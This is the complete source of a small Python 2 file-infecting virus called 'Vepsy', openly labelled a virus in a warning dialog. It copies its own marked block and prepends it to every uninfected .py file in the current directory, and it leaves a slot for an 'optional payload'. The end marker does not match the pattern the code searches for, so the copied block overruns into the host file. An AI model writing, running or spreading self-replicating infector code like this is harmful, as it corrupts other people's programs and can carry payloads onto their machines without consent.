##### VEPSY START #####
import sys, glob, re, tkMessageBox

tkMessageBox.showinfo(title="WARNING", message="You are about to run Vepsy. This is a virus, and the owner is not responsible for any damages caused. USE IN VM!")

#get copy of Vepsy
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if (re.search('^##### VEPSY START #####', line)): inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search('^##### VEPSY END #####', line)): break

#find victims
progs = glob.glob("*.py")

#check and infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('##### VEPSY START #####' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        #Writing new vepsy infected code
        fh = open(prog, "w")
        fh.writelines(newCode)
        fh.close()
#optional payload

#####VEPSY END #####
